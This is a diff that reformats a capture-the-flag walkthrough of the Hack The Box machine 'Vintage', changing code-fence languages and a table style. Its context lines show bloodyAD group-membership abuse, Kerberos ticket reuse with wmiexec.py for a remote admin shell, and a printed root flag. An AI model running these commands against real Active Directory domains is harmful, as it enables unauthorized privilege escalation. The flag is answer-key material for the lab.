@@ -55,7 +55,7 @@
 <table width="100%">
   <thead>
     <tr>
-      <th>Tactics</th>
+      <th style="min-width: 250px; white-space: nowrap;">Tactics</th>
       <th>Techniques</th>
       <th>Description</th>
     </tr>
@@ -1044,7 +1044,7 @@ bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" add groupMember DelegatedAd
 ```
 > We return to the session in the system and check that the changes have been successfully applied:
 
-```bash
+```powershell
 
 PS C:\Windows\system32> Get-ADGroupMember "DelegatedAdmins"
 
@@ -1053,12 +1053,12 @@ PS C:\Windows\system32> Get-ADGroupMember "DelegatedAdmins"
  <img src="./screenshots/svc_sql_delegated_admins.png" alt="svc_sql_delegated_admins" />
 </p>
 
-```bash
+```powershell
 
 PS C:\Windows\system32> Get-ADUser svc_sql -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
 
 ```
-```bash
+```powershell
 
 ldap/user.domain.local
 
@@ -1119,7 +1119,7 @@ export KRB5CCNAME=L.Bianchi_adm@ldap_dc01.vintage.htb@VINTAGE.HTB.ccache
 wmiexec.py -k -no-pass L.Bianchi_adm@dc01.vintage.htb -dc-ip 10.10.11.45
 
 ```
-```bash
+```powershell
 
 C:\>whoami
 vintage\l.bianchi_adm
@@ -1129,7 +1129,7 @@ C:\>
 ```
 > I get the **Last Flag** in the directory - `C:\Users\Administrator\Desktop`
 
-```bash
+```powershell
 
 C:\Users\Administrator\Desktop>type root.txt
 b7f150982cbbf0239b6c07d1209594f1
